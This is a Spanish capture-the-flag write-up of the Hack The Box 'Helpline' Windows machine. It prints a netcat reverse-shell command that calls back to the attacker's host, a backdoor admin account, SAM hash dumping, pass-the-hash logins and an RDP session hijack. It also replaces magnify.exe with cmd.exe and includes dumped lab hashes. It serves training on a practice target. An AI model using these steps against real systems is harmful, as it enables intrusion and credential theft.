---
layout: single
title:  "Helpline HTB"
categories: [ctf, htb]
---

## Helpline writeup (SPANISH)
<img src="/assets/htb/helpline/Pasted image 20211105171452.png"> 

### Descripcion de la maquina

|                   |                 |
|-------------------|-----------------|
| Helpline         | [HTB Helpline](https://tryhackme.com/room/hololive "Holo Live") |
| Guglia001          | [Guglia001](https://tryhackme.com/p/guglia001)     |
|        IP        | 10.10.10.132
| 					Dificultad					|<span style="color:red">Hard</span>

Esta es una máquina en la cual hay muchas maneras de resolverla, conseguir el rce es muy fácil, solo es cuestión de probar exploits a un servicio en el cual no sabemos que versión es. Luego la escalada de privilegios es una pasada, ya que vamos a jugar con permisos de archivos, *creds dump* ,*pass the hash*, *rdp*. Hay una parte que no creo que sea intencionada en la que tenemos acceso al rdp del user y no podemos iniciar sesión, pero como tenemos shell como  *system* cambiamos él .exe de la lupa para que al abrirla se nos ejecute cmd.exe <br> <b> Todo esto sin usar mimikatz o metasploit </b>
# Enumeracion
Escaneamos la ip con estos comando de nmap
``` bash
sudo nmap -p- -sS --min-rate 5000 -vvv -n -Pn --open -oG allPorts 10.10.10.132
```
Vamos a ver por encima que parámetros estoy utilizando <br>
**`-p`** Escanear todos los puertos posibles (1-65536).
**`-sS`** Service scan .
**`--min-rate`** Significa  que envíe  como mínimo 5000 paquetes por segundo (Muy ruidoso, pero da igual, ya que estamos en HackTheBox).
**`-n`** Que no aplique resolución  de dns. <br>
Tenemos los siguientes puertos abiertos
```bash
PORT      STATE SERVICE      REASON  
135/tcp   open  msrpc        syn-ack ttl 127  
445/tcp   open  microsoft-ds syn-ack ttl 127  
5985/tcp  open  wsman        syn-ack ttl 127  
8080/tcp  open  http-proxy   syn-ack ttl 127  
49667/tcp open  unknown      syn-ack ttl 127
```

Procedemos a escanear los servicios
```bash
nmap -sCV -Pn -p 135,445,5985,8080,49667 10.10.10.132
```


En este momento me llaman la atención 2 cosas. Una es que tenemos el puerto 5985 (winrm) abierto y ya me hace pensar que al momento de tener credenciales nos podríamos loguear usando [evil-winrm](https://github.com/Hackplayers/evil-winrm).
La segunda es que empecemos la enumeración en los puertos
**8080/http** y **445/smb**
```Bash
smbclient -L 10.10.10.132 -N   
	session setup failed: NT_STATUS_ACCESS_DENIED
```


```Bash
 whatweb http://10.10.10.132:8080  
	http://10.10.10.132:8080 [200 OK] Cookies[JSESSIONID], Country[RESERVED][ZZ], Frame, HTML5, HTTPServer[-], HttpOnly[JSESSIONID], IP[10.10.10.132], JQuery[1.8.3], Java, PasswordField[j_password], Script[text/JavaScript,text/javascript],  
	Title[ManageEngine ServiceDesk Plus], X-UA-Compatible[IE=Edge]
```

Nos encontramos con un servicio llamado ManageEngine, buscando un poco en google podemos encontrar tiene un login de invitado con el cual podemos acceder
Ref:[pitstop.manageengine.com](https://pitstop.manageengine.com/portal/en/community/topic/security-warning-after-upgrading-to)
<img src="/assets/htb/helpline/Pasted image 20211105181403.png">
Después de intentar varios CVE, ya que no podemos ver que versión es. Doy con un exploit con el cual le robamos el cookie del admin <br>
https://www.exploit-db.com/exploits/46659
-  Cambiamos la variable host por la ip de la maquina victima
<img src="/assets/htb/helpline/Pasted image 20211105184643.png">
Obtenemos el cookie y lo ponemos en nuestro navegador
<img src="/assets/htb/helpline/Pasted image 20211105184854.png">
Una vez dentro como usuario admin en configuraciones. Nos metemos en `servicio de asistencia` y encontramos una acción llamada `Activadores personalizados` en la cual nos permite ejecutar un comando 
<img src="/assets/htb/helpline/Pasted image 20211105192604.png">
Mi método para crear la reverse shell es el siguiente
- Primero nos descargamos el binario de netcat para windows o lo copiamos desde nuestro propio OS buscándolo con `locate nc.exe`
- Creamos una carpeta compartida con impacket `sudo impacket-smbserver mario $(pwd) -smb2support` Le asignamos permiso de ejecución al netcat `chmod +x nc.exe`
- por último creamos una tarea en la cual cuando se  cree una solicitud con el asunto *reverse* se nos ejecute el siguiente comando `cmd /c //10.10.14.9/mario/nc.exe -e cmd 10.10.14.9 3001`
-  `rlwrap nc -lvp 3001`
 <img src="/assets/htb/helpline/Pasted image 20211105192749.png">
 
 Obtenemos nuestra primera reverse shell 
 <img src="/assets/htb/helpline/Pasted image 20211105192927.png">
 
 Nos encontramos que somos `NT/autority` y que estamos en el disco E: nos cambiamos a C con el siguiente comando *`C:`* Y luego al intentar ver los flags del *user* y *Administrator*, no tenemos permisos
 <img src="/assets/htb/helpline/Pasted image 20211105193907.png"> <br>
 Usando cacls vemos que es de nuestro usuario
 ```cmd
 cacls root.txt /T  
C:\Users\Administrator\Desktop\root.txt NT AUTHORITY\SYSTEM:R    
                                       HELPLINE\Administrator:R    
                                       BUILTIN\Administrators:R
 ```
 
 Ejecutando `cipher` podemos ver que esta encriptada. Solo la puede descencriptar `administrator` :neutral_face:
 ```bash
 cipher /c root.txt  
  
Listing C:\Users\Administrator\Desktop\  
New files added to this directory will not be encrypted.  
  
E root.txt  
 Compatibility Level:  
   Windows XP/Server 2003  
  
 Users who can decrypt:  
   HELPLINE\Administrator [Administrator(Administrator@HELPLINE)]  
   Certificate thumbprint: FB15 4575 993A 250F E826 DBAC 79EF 26C2 11CB 77B3    
  
 No recovery certificate found.  
  
 Key information cannot be retrieved.  
  
The specified file could not be decrypted.
 ```
 
Necesitamos las contraseñas de los usuarios para poder ver las flags esto pasa que están  encriptadas en [EFS](https://www.redeszone.net/tutoriales/seguridad/encrypting-file-system-efs-cifrado-archivos-windows-10/)

No voy a usar mimikatz en este writeup ,creo un usuario admin y luego dumpeo las credenciales con [secretsdump](https://airman604.medium.com/dumping-active-directory-password-hashes-deb9468d1633) :pizza:
 
   ```bash
 net user mario mario123 /add
net localgroup administrators mario /add
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
 ``` 


  ```bash
#Activamos RDP
PS> Set-NetFirewallRule -Name RemoteDesktop-UserMode-In-TCP -Enabled true
PS> Set-ItemProperty -Path 'HKLM:\\System\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp' -name "UserAuthentication" -Value 1
PS> Set-ItemProperty -Path 'HKLM:\\System\\CurrentControlSet\\Control\\Terminal Server'-name "fDenyTSConnections" -Value 0
 ```

```bash 
secretsdump.py mario:mario123@10.10.10.132 
```
```ru
[*] Service RemoteRegistry is in stopped state  
[*] Starting service RemoteRegistry  
[*] Target system bootKey: 0xf684313986dcdab719c2950661809893  
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)  
Administrator:500:aad3b435b51404eeaad3b435b51404ee:d5312b245d641b3fae0d07493a022622:::  
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::  
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::  
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:52a344a6229f7bfa074d3052023f0b41:::  
alice:1000:aad3b435b51404eeaad3b435b51404ee:998a9de69e883618e987080249d20253:::  
zachary:1007:aad3b435b51404eeaad3b435b51404ee:eef285f4c800bcd1ae1e84c371eeb282:::  
leo:1009:aad3b435b51404eeaad3b435b51404ee:60b05a66232e2eb067b973c889b615dd:::  
niels:1010:aad3b435b51404eeaad3b435b51404ee:35a9de42e66dcdd5d512a796d03aef50:::  
tolu:1011:aad3b435b51404eeaad3b435b51404ee:03e2ec7aa7e82e479be07ecd34f1603b:::  
mario:1012:aad3b435b51404eeaad3b435b51404ee:54a62417bb6a4beb67c8b4a2dc7a6897:::  
[*] Dumping cached domain logon information (domain/username:hash)  
[*] Dumping LSA Secrets  
[*] DefaultPassword    
leo:fe22ca6029a87b98e527686a56c12aa9  
[*] DPAPI_SYSTEM    
dpapi_machinekey:0xac6ecf4487d6451ab055dde974cd04dd2ae8463c  
dpapi_userkey:0x2d28120da695e819700547fa7329d71dc8e9b546  
[*] NL$KM    
0000   E3 05 BC AB 6F AC 32 0E  38 53 9A 46 3E A8 2B 90   ....o.2.8S.F>.+.  
0010   3E 1E A1 C3 94 65 8D 5D  5A 2A 6D F5 FC C4 93 49   >....e.]Z*m....I  
0020   CE 68 24 DF 38 F0 A6 3D  E1 60 73 E2 B1 CE 1A CC   .h$.8..=.`s.....  
0030   43 DB 81 EE C8 34 DE 2E  98 4E 5C D3 35 3F 4A D4   C....4...N\.5?J.  
NL$KM:e305bcab6fac320e38539a463ea82b903e1ea1c394658d5d5a2a6df5fcc49349ce6824df38f0a63de16073e2b1ce1acc43db81eec834de2e984e5cd3353f4ad4  
[*] Cleaning up...    
[*] Stopping service RemoteRegistry
```
## User flag
* Aquí  vemos que hay un default password para el usuario leo, el cual es un falso positivo.. <br>
Ya que tenemos los hashes de todos los usuarios podemos hacer **Pass The Hash**

```bash
psexec.py administrator@10.10.10.132 cmd -hashes 'aad3b435b51404eeaad3b435b51404ee:d5312b245d641b3fae0d07493a022622'
```

```py
xfreerdp /v:10.10.10.132:3389 /u:administrator /pth:d5312b245d641b3fae0d07493a022622
```

### RDP hijacking
Nos encontramos con esta sorpresa :heart_eyes:
<img src="/assets/htb/helpline/Pasted image 20211105222706.png">
Esto lo que me hace pensar es que hay otra sesión  de rdp abierta , nos la podemos atachear con la terminal que abrimos antes

```bash
C:\>query session
 SESSIONNAME       USERNAME                 ID  STATE   TYPE        DEVICE 
>services                                    0  Disc                        
 console           leo                       1  Active                      
 rdp-tcp#5                                   2  ConnQ                       
 rdp-tcp                                 65536  Listen                
```
Existe una session con el usuario leo vamos a robarle la sesion de rdp. Para esto nesecitamos tener la sesion de rdp abierta y hacerlo rapido antes que se nos cierre
```bash
tscon 1 /dest:rdp-tcp#5
```

<img src="/assets/htb/helpline/Pasted image 20211105230516.png">
Está el usuario bloqueado.. Hay una clasica forma muy divertida de bypassear esto en cualquier version de windows  y funciona de la siguiente manera: <br>
..* En esta pantalla de login abajo en la derecha hay un botón de accesibilidad cuando le hacemos click se nos abre una ventana de opciones y una de ellas es la opción de lupa ( magnifier  en ingles) <br>
<img src="/assets/htb/helpline/Pasted image 20211105231643.png"><br>
 Como tenemos una shell como system podemos reemplazar este archivo que se ejecuta cuando abrimos la lupa por una ventana de cmd


Estando en la carpeta `system32` copiamos el cmd.exe y lo guardamos como magnify.exe *pero con encontramos con otra sorpresa* :heart_eyes: :heart_eyes:
```bash
C:\Windows\system32>copy cmd.exe magnify.exe  
Overwrite magnify.exe? (Yes/No/All): YES  
'Access is denied.\r\n'        0 file(s) copied.
```
No tenemos permisos para tocar el archivo. Tomamos el control de el de la siguiente manera 
```bash
C:\Windows\system32>takeown /f magnify.exe  
SUCCESS: The file (or folder): "C:\Windows\system32\magnify.exe" now owned by user "HTB\HELPLINE$".

C:\Windows\system32>icacls magnify.exe /grant "Everyone":F  
processed file: magnify.exe  
Successfully processed 1 files; Failed processing 0 files

C:\Windows\system32>copy cmd.exe magnify.exe
```
Nota: Aveces psexec da error al ejecutar estos comandos si no funciona usar evil-winrm 
`evil-winrm -i 10.10.10.132 -u administrator -H d5312b245d641b3fae0d07493a022622`
<img src="/assets/htb/helpline/Pasted image 20211106002328.png">

Con esta sesión podemos ejecutar `regedit` y ver cuál es la clave de *leo*, ya que habiamos visto que tenía autologin por ende su clave debe estar aquí ``HKLM\Software\Microsoft\Windows NT\CurrentVersion\WinLogon``
<img src="/assets/htb/helpline/Pasted image 20211106003012.png">
 <br>
* Metemos a todos los usuarios en remote management
```
 PS> net localgroup "Remote Desktop Users" Everyone /Add
 ```
* Ya en el escritorio cambiamos los permisos para leo y podemos ver el `admin-pass.xml`
<br>
<img src="/assets/htb/helpline/Pasted image 20211106010445.png">
<br>
Esto por lo que entiendo es `powershell secure string` Vamos a descifrarlo [Ref](https://stackoverflow.com/questions/28352141/convert-a-secure-string-to-plain-text)


```bash
$Contra1 = Get-Content admin-pass.xml | ConvertTo-SecureString
$Contra2 = (New-Object PSCredential "administrator",$Contra1).GetNetworkCredential().Password
echo $Contra2

mb@letmein@SERVER#acc
```

<img src="/assets/htb/helpline/Pasted image 20211106012509.png">

Ahora tenemos la contraseña del administrador con la cual podemos ver la flag `root.txt` haciéndonos dueños del archivo 
<img src="/assets/htb/helpline/Pasted image 20211106021814.png">
<img src="/assets/htb/helpline/Pasted image 20211106024344.png">
## User Flag
* Ahora necesitamos  la contraseña de `tolu` para poder ver la flag . viendo en el `event viewer` encuentro un inicio de sesion 
<img src="/assets/htb/helpline/Pasted image 20211106023521.png">
* Aqui facil, ejecutamos cmd como un usuario diferente y ponemos las credenciales de `tolu` :collision:
<img src="/assets/htb/helpline/Pasted image 20211106024252.png">